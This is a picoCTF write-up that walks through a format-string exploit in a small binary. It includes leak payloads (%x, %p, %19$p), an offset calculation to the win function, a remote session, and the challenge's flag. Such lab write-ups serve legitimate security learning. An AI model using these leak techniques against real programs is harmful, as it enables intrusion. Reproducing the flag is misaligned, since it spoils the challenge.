# Description
```
Can you try to get the flag? I'm not revealing anything anymore!!
```
---
We are asked to enter a name to a buffer and then an address to jump to, but without giving us the address of `main`. What we'd need is to leak some address and based on that calculate the address of `win`.

Here I found a format string vulnerability:
```C
14: fgets(buffer, 64, stdin);  
15: printf(buffer);
```
I read online about how I can utilize `%p` or `%x` to my advantage, and learned that the percent signs just read from the either the call frame (stack) or registers.
Trying to manually write a series of `%x` got me reading the input I was giving:
```shell
$ ./vuln
Enter your name:AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
AAAA 555592a1 fbad2288 aaaa6d5f 555592d5 410 ffffe0d0 f7c92415 41414141 ... # < HERE
```
Then it got me curious so I tried to look for the return address on the stack, but working with `%x` didn't lead me anywhere for some time, so I moved to using `%p`'s.

Using `gdb` to debug the program whilst inputting, I noted the addresses of `main`, `win`, `call_functions` and `segfault_handler` and exhausted my input with `%p`'s:
```
$ ./vuln
Enter your name:%p * 21
... addresses ...
```
With a bit of trial and error and misleading addresses, I found I can look at the process map in `gdb` with `info proc mappings`, which indicated to me that the first address we receive is on the heap (which wouldn't be deterministic and we can't calculate the offset with that), and one of the last ones (No 3 from the end) is located inside the code segment, which seems to be inside `main`.
Using that address, we could calculate the delta between it and the `win` function, which is static in every run:
```
0x5fef7784d441 - 0x5fef7784d376 = 203
```

Using that on remote:
```
$ nc picoctf.net PORT
Enter your name:%19$p
0x62d4bee5c441
 enter the address to jump to, ex => 0x12345: 0x62d4bee5c376
You won!
FLAG{}
```

# Flag
```
picoCTF{p13_5h0u1dn'7_134k_cdbb451d}
```

#### Useful Resources I Found
^[1] [Lec 6: Format String Attacks, *Kaist*](https://softsec.kaist.ac.kr/depot/sangkilc/is50601/06-format.pdf) 
^[2] [Format String Vulnerability, *Hacking Lab*](https://hackinglab.cz/en/blog/format-string-vulnerability/)